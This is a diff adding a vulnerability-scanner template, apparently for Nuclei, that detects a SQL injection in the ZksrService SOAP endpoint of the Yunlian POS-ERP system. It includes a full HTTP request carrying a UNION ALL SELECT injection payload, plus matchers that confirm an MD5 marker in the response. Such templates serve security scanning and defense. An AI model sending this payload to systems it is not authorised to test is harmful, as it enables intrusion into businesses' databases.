@@ -1,0 +1,49 @@
+id: yunlian-pos-erp-sqli
+info:
+  name: Yunlian POS-ERP Management System ZksrService SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The Yunlian POS-ERP system ZksrService endpoint is vulnerable to SQL injection,
+    allowing attackers to execute arbitrary SQL queries.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /services/ZksrService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: ""
+        Content-Type: text/xml; charset=UTF-8
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.service.chaosZ.com">
+        <soapenv:Header/>
+            <soapenv:Body>
+                <web:getItemInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                    <data xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">{"CargoOwner":"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),NULL-- qfYz"}
+                    </data>
+                </web:getItemInfo>
+            </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</getItemInfoReturn>"
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
